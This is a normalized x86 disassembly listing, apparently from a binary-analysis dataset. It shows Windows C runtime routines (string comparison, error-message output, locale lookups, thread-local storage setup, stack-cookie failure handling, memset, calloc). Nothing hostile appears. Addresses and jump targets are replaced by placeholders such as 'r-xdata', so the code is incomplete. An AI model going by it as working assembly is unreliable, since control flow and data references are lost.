call sub_41a7eb
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_41a7eb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_41e140
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_41e2db
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_41e301
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41e2db
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
push 0x3
call sub_4276a6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_4276a6
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_41b6cb
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_41d120
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_41ef83
push esi
call sub_42768b
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_41b6cb
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_41b656
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_42768b
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_4275be
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_41b656
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_427452
add esp 0xc
jmp r-xdata
sub_41e4b0
push 0x3
call sub_4276a6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_41e301
push 0xff
call sub_41e301
pop ecx
pop ecx
push 0x3
call sub_4276a6
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_41e4e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_4277bf
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_41c26e
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_41a7eb
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_41c26e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_42526f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_4277bf
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41ef83
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_41a7eb
pop ecx
inc esi
push esi
push eax
call sub_41c26e
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_41a7eb
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_4277bf
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
sub_41e6d4
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_41e708
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_41a7eb
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_41e745
push 0x8
push r--data
call sub_421220
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e7e7
push 0xc
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_41f38a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e7f0
call sub_421265
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_41e7f9
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_41e6d4
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_41c26e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_41a7eb
pop ecx
xor esi esi
push 0x0
push esi
call sub_41e745
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_41e88c
push 0x8
push r--data
call sub_421220
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_421265
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_41a7eb
pop ecx
push 0xd
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e9a6
push 0xc
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e9b2
push esi
call sub_41a7eb
pop ecx
push edi
call sub_41f419
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_41a7eb
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41f4b2
pop ecx
sub_41e9bb
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_41e88c
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_41ea29
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_41e708
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_41e6cb
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_41f0f4
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_425055
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_41e708
mov edi [ DecodePointer@IAT ]
push sub_41e88c
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_41c26e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_41e745
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_41ec40
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_42790c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_42790c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41ec8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_427937
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_427937
pop ecx
sub_41eda1
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41edc9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_41c34a
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_41eda1
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_41ee5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_41adb0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_427937
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_427937
pop ecx
sub_41ef83
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_41ee5a
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_41efa8
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ef83
int3
pop ebp
jmp eax
sub_41efe5
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_41f09f
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_41f0f4
mov edi edi
push esi
call sub_41e6c2
mov esi eax
push esi
call sub_41ed92
push esi
call sub_41ee4b
push esi
call sub_41e695
push esi
call sub_41b233
push esi
call sub_4270f5
push esi
call sub_41ec28
add esp 0x18
pop esi
retn
sub_41f127
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_41f14b
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_421088
push r--data
push r--data
call sub_41f127
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_4279d0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_423344
call sub_41b488
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_4279d0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_41f1e2
push 0x20
push r--data
call sub_421220
push 0x8
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f30d
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_421265
retn
mov [ rw-data ] 0x1
push 0x8
call sub_4250f6
pop ecx
push [ ebp + 0x8 ]
call sub_41f0ca
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_41e6c2
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_41e6c2
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_41f38a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_41f419
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_41f4b2
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_41a7eb
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_41a7eb
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_41a7eb
push [ esi + 0xc0 ]
call sub_41a7eb
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_4245a7
push [ esi + 0xd4 ]
call sub_41a7eb
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_41a7eb
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_41a7eb
pop ecx
push [ esi + 0xb0 ]
call sub_41a7eb
push [ esi + 0xbc ]
call sub_41a7eb
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_41a7eb
push [ esi + 0xbc ]
call sub_424bf4
pop ecx
pop ecx
push eax
call sub_41a7eb
pop ecx
push eax
call sub_41a7eb
push [ esi + 0xbc ]
call sub_42499b
pop ecx
pop ecx
sub_41f5fd
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_41f38a
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_41f419
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_41f4b2
